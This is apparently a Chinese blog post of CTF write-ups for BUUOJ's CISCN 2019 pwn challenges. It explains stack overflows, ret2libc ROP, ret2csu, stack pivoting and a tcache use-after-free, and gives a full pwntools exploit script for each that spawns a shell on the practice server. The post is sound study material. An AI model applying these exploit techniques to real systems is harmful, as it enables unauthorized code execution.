---
layout:     post
title:      buuoj-ciscn部分wp
subtitle:   write up
date:       2020-08-19
author:     X1ng
header-img: buuoj819.jpg
catalog: true
tags:
    - buuoj
    - wp


---

突然发现2020国赛要来了，临时抱佛脚去buuoj刷一波ciscn的题

### ciscn_2019_n_1

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghnekxnch7j30oy06a0sx.jpg)

ida pro打开

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghncq6joghj31na0t4q9n.jpg)

可以看到红框内汇编代码，虽然不是很清楚指令什么意思，但大概应该是比较（f5后伪代码也确实是比较）两处内存的数据（浮点数在内存中也是通过十六进制表示的）

双击下面的`cs：dword_4007F4`可以看到

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghncs5ijrhj31nc05c0ti.jpg)

所以只要计算偏移将这个十六进制数写入内存即可

exp：

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

#p = process('./ciscn_2019_n_1')
p = remote("node3.buuoj.cn", 26194)
#gdb.attach(p,'b *0x4006AE')

p.recvuntil('\n')
payload = 'a'*0x2c+p32(0x41348000)
p.sendline(payload)

p.interactive()

```

### ciscn_2019_c_1

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghnh8hce3pj30pa06eaaa.jpg)

没有canary

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghnhc3k4mlj31070u0tba.jpg)

有gets函数，考虑直接rop

思路就是控制执行流通过puts泄露函数真实地址，然后返回start函数执行`system('/bin/sh')`

libcseacher找不到，只好到https://libc.blukat.me/网站找

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghnhg0o338j31ss0t8dhf.jpg)

ROPgadget找能用的gadget

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghni098b0vj31880k6q4c.jpg)

exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
context.log_level='debug'

elf = ELF('./ciscn_2019_c_1')
p = process('./ciscn_2019_c_1')
#p = remote("node3.buuoj.cn", 27144)
gdb.attach(p,'b *0x400bb6\nb* 0x400AE7')

poprdi=0x400c83
puts=elf.plt['puts']
puts_got=elf.got['puts']
start = 0x400790

p.recv(0x217)
p.sendline('1')
p.recvuntil('\n')
payload = 'a'*80+'b'*8+p64(poprdi)+p64(puts_got)+p64(puts)
payload += p64(start)

p.sendline(payload)
print p.recvuntil('\n')
print p.recvuntil('\n')

puts=u64(p.recv(6).ljust(8,'\x00'))
print hex(puts)

ret = 0x4006b9
system_addr=puts-0x31550
bin_sh=puts+0x1336ca
payload = 'a'*88+p64(ret)+p64(poprdi)+p64(bin_sh)+p64(system_addr)
p.recv(0x217)
p.sendline('1')
p.recvuntil('\n')
p.sendline(payload)

p.interactive()
```

刚写好发现调用system函数会发生错误

```
timeout: the monitored command dumped core
```

看了[Ex师傅的文章](http://blog.eonew.cn/archives/958)才知道调用system函数的时候栈没有0x10对齐，所以需要在payload中多加了一个`ret`

加了`ret`后本地能getshell了 远程还是不行 

后来在buuoj上下载libc-2.27.so后修改的exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
context.log_level='debug'

elf = ELF('./ciscn_2019_c_1')
#p = process('./ciscn_2019_c_1')
p = remote("node3.buuoj.cn", 25449)
#gdb.attach(p,'b *0x400bb6\nb* 0x400AE7')
libc=ELF("./libc-2.27.so")

poprdi=0x400c83
puts=elf.plt['puts']
puts_got=elf.got['puts']

p.recv(0x217)
p.sendline('1')
p.recvuntil('\n')
payload = 'a'*80+'b'*8+p64(poprdi)+p64(puts_got)+p64(puts)
payload += p64(0x400790)

p.sendline(payload)
print p.recvuntil('\n')
print p.recvuntil('\n')

puts=u64(p.recv(6).ljust(8,'\x00'))
print hex(puts)

libcbase=puts-libc.sym['puts']
system_addr=libcbase+libc.sym['system']
bin_sh=libcbase+libc.search("/bin/sh\x00").next()
payload = 'a'*88+p64(0x4006b9)+p64(poprdi)+p64(bin_sh)+p64(system_addr)
p.recv(0x217)
p.sendline('1')
p.recvuntil('\n')
p.sendline(payload)

p.interactive()
```

远程成功getshell，之前的exp不能getshell可能是由于本地libc与靶机libc不同的原因（虽然都是ubuntu18）

### ciscn_2019_en_2

可能放错文件了，和上面一题是同个文件

### ciscn_2019_n_8

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghny7dsp8bj30pe066gls.jpg)

保护全开

ida pro打开

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghny6ecercj317i0u0din.jpg)

有后门函数，只要输入的字符串中在var[13]处是`\x11`（17）即可

exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

elf = ELF('./ciscn_2019_n_8')
#p = process('./ciscn_2019_n_8')
p = remote("node3.buuoj.cn", 28995)
context.log_level='debug'
#gdb.attach(p,'b *$rebase(0x1324)')

p.recvuntil('name?\n')
payload = 'a'*32+'b'*20+'\x11'
p.sendline(payload)

p.interactive()

```

### ciscn_2019_n_5

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghny686nxkj30yq074aax.jpg)

没有保护

ida pro打开

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghnylftk2xj31e40hqta1.jpg)

啊这

一样的rop

exp

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
context.log_level='debug'

elf = ELF('./ciscn_2019_n_5')
#p = process('./ciscn_2019_n_5')
p = remote("node3.buuoj.cn", 27072)
#gdb.attach(p,'b *main')
libc=ELF("./libc-2.27.so")

poprdi=0x400713
puts=elf.plt['puts']
puts_got=elf.got['puts']
start = 0x400540

p.recvuntil('name\n')
p.sendline('1')
p.recvuntil('me?\n')
payload = 'a'*40+p64(poprdi)+p64(puts_got)+p64(puts)
payload += p64(start)
p.sendline(payload)

puts=u64(p.recv(6).ljust(8,'\x00'))
print hex(puts)

libcbase=puts-libc.sym['puts']
system_addr=libcbase+libc.sym['system']
bin_sh=libcbase+libc.search("/bin/sh\x00").next()
ret = 0x4004c9

p.recvuntil('name\n')
p.sendline('1')
p.recvuntil('me?\n')
payload = 'a'*40+p64(ret)+p64(poprdi)+p64(bin_sh)+p64(system_addr)
p.sendline(payload)

p.interactive()
```

### ciscn_2019_s_3

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghnz8czhokj30mm064wen.jpg)

ida pro打开

vuln函数的两个系统调用

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gho3kclqfej327y0rigtc.jpg)

函数的逻辑是通过read系统调用输入字符串后再通过write系统调用输出所输入的字符串

还有一个gadgets函数

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gho3l1ew1xj31n80i6415.jpg)

0x3b==59，是execve的系统调用号，加上两个系统调用，很明显提示可以通过系统调用`execve("/bin/sh",0,0)`来getshell

但是需要三个参数，就需要利用ret2csu的方法，相关知识[ctf-wiki](https://wiki.x10sec.org/pwn/stackoverflow/medium_rop/)上有很好的讲解，这里不再啰嗦

就是利用csu函数中这几个gadgets从而将参数传递到寄存器中

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gho3sdcurpj31na0igadf.jpg)

然而获取字符串"/bin/sh"的地址是一个问题

观察栈中的情况发现此时rbp与rsp重合，只要覆盖rbp就能控制执行流，rbp后有一处保存栈地址，所以可以通过write系统调用泄露栈地址，而rbp之上的16字节可以任意填充

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1gho48hmzbfj313e0u0dj9.jpg)

就可以将需要的字符串写到栈中，通过泄露的栈地址计算偏移得到字符串的地址

可以把`ret`的地址放到第二个八字节处，绕过`call qword ptr [r12+rbx*8]`

exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
context.log_level='debug'

elf = ELF('./ciscn_s_3')
#p = process('./ciscn_s_3')
p = remote("node3.buuoj.cn", 25564)
#gdb.attach(p,'b *main')
libc=ELF("./libc-2.27.so")

poprdi=0x4005a3
movrax=0x4004E2
read=0x4004F1
syscall=0x400517

payload = 'a'*0x10+p64(read)+'a'*7
p.sendline(payload)
p.recv(0x20)
stack=u64(p.recv(6).ljust(8,'\x00'))
stack-=0x110
print hex(stack)

pop6=0x40059A
mov3=0x400580
ret=0x4005A4

payload = '/bin/sh\x00'+p64(ret)+p64(pop6)
payload += p64(0)+p64(1)+p64(stack+8)+p64(0)+p64(0)+p64(stack)
payload += p64(mov3)+p64(0)*7+p64(poprdi)+p64(stack)+p64(movrax)+p64(syscall)
p.sendline(payload)

p.interactive()

```

### ciscn_2019_ne_5（没做出来）

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghuzm89jo9j30oc066glt.jpg)

f5报错Decompilation failure: call analysis failed，根据[百度到师傅的博客](https://blog.csdn.net/xiangshangbashaonian/article/details/82889924)双击_isoc99_scanf函数后解决

主要函数

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghv6xdswgpj30u0135wpj.jpg)

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghv6ycumg0j30q206kmxd.jpg)

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghv6yj6h5cj30o2066mx6.jpg)

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghv6yy7uihj30pc06g0ss.jpg)

有system函数

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghv6z6aoxcj30ym0d6t9p.jpg)

在strcpy复制的时候存在溢出

开始我还想泄露栈地址，写入"/bin/sh"，后俩发现行不通，又想着直接泄露地址用libc里的"/bin/sh"，又卡在了奇怪的地方（憨憨落泪）

参考了百度上师傅的wp，才知道这个小技巧

main函数调用了fflush函数，所以内存中有"fflush"字符串，只要把其中的"sh"作为调用system函数的参数就可以了

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghv758lmbij317w02eq2w.jpg)

找到"sh"的地址，rop就能getshell了

exp

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'

elf = ELF('./ciscn_2019_ne_5')
#p = process('./ciscn_2019_ne_5')
p = remote("node3.buuoj.cn", 27461)
#gdb.attach(p,'b *0x08048667\n b *0x80486fc')

libc=ELF("./libc-2.27.so")
system = elf.plt['system']
sh = 0x080482ea

p.recvuntil('Please input admin password:')
p.sendline('administrator')

p.recvuntil('0.Exit')
p.recvuntil(':')
p.sendline('1')
payload = 'a'*8+'b'*60+'c'*8
payload += p32(system)+'aaaa'+p32(sh)
p.recvuntil('info:')
p.sendline(payload)

p.recvuntil('0.Exit')
p.recvuntil(':')
p.sendline('4')

p.interactive()

```

### ciscn_2019_es_2

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghv80vzq73j30oo06c0sy.jpg)

主要函数

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghv8feyy1sj30r20buq3p.jpg)

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghv8fi56k5j30ng05wdfv.jpg)

栈溢出，两次输入机会，一次泄露ebp后栈迁移，让esp指向我们可以控制输入的地址，从而增加可写rop链的栈长度

在栈中写入"/bin/sh"作为system函数的参数

exp

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

elf = ELF('./ciscn_2019_es_2')
#p = process('./ciscn_2019_es_2')
p = remote("node3.buuoj.cn", 27074)
#gdb.attach(p,'b *0x80485fd')

leave = 0x080485FD
system = 0x08048400
ret = 0x08048636
p.recvuntil('What\'s your name?')
p.sendline('a'*39)
p.recvline()
p.recvline()
ebp = u32(p.recv(4))
print hex(ebp)
payload = p32(ebp)+p32(system)+p32(0)+p32(ebp-40)+'/bin/sh\x00'+'a'*16+p32(ebp-56)+p32(leave)
p.send(payload)
p.interactive()
```

不知道什么原因，我把"/bin/sh"字符串写在前面执行system函数就会失败

### ciscn_2019_es_2

例行检查

![](https://tva1.sinaimg.cn/large/007S8ZIlly1ghvuyiswskj30mu062q34.jpg)

主要函数

![](https://tva1.sinaimg.cn/large/007S8ZIlly1ghwcx1gs4vj30xk0u0tj7.jpg)

调用了system函数

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghwcxc8mp6j31ju0rc0w0.jpg)

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghwdctb6whj31a20963yy.jpg)

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghwcxmbt0tj31hy0am3yz.jpg)

一道菜单题，函数逻辑是

申请一个note的时候，先申请一个大小为0xc的chunk，用于存放print函数和free函数的函数指针以及存放内容chunk的地址，再申请一个chunk用来存放输入的内容（将这个chunk的指针放在上一个chunk中）

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghwdc8f6uij30hy0hoq2v.jpg)

又通过records数组来保存每个note对应的低地址的chunk

释放一个note的时候，先释放高地址chunk，再释放低地址chunk

如果我们申请一个size为0xc的chunk再释放掉的话，tcache中

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghwdidmdt1j314m0h83yz.jpg)

释放后没有清空records数组中chunk的指针，存在uaf漏洞

由于每个note的低地址chunk中保存着free的函数指针，再释放的时候又要将两个chunk都释放掉，如果我们能控制保存函数指针的chunk，将free函数的函数指针改为system函数plt表地址，再让这个note的高地址chunk或低地址chunk内容为"sh"字符串，就能在释放这个note时gatshell

可以先申请一个size为0xc的note(chunk0)和一个size为其他大小的note(chunk1)，再将两个note都释放，构造这样的tcache bin

![](https://tva1.sinaimg.cn/large/007S8ZIlgy1ghwe33stnaj314k0i8jry.jpg)

`0x8b74180`和`0x8b74160`在records数组中都作为低地址的chunk没有被清空

如果下次申请的是size为0xc的note，就会将`0x8b74180`作为低地址的chunk，`0x8b74160`作为高地址的chunk分配出来

也就是说我们就能控制`0x8b74160`中的内容，从而在原来应该是print函数指针的地方写入"sh\x00\x00"，在原来应该是free函数指针的地方写入system函数地址

下次循环只要free掉chunk0，就相当于执行了`system(sh)`

exp

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'

p = process('./ciscn_2019_n_3')
#p = remote("node3.buuoj.cn", 29437)


def add(content, idx, size=32):
	p.recvuntil('CNote')
	p.recvuntil(' > ')
	p.sendline('1')
	p.recvuntil(' > ')
	p.sendline(str(idx))
	p.recvuntil(' > ')
	p.sendline('2')
	p.sendline(str(size))
	p.recvuntil(' > ')
	p.sendline(content)

def delete(idx):
	p.recvuntil('CNote')
	p.recvuntil(' > ')
	p.sendline('2')
	p.recvuntil(' > ')
	p.sendline(str(idx))

def show(idx):
	p.recvuntil('CNote')
	p.recvuntil(' > ')
	p.sendline('3')
	p.recvuntil(' > ')
	p.sendline(str(idx))


system = 0x8048500
gdb.attach(p,'b *0x08048934')
add('aaa',0,0xc)
add('aaa',1,0x10)
delete(0)
delete(1)
add('sh\x00\x00'+p32(system),2,0xc)
delete(0)

p.interactive()
```

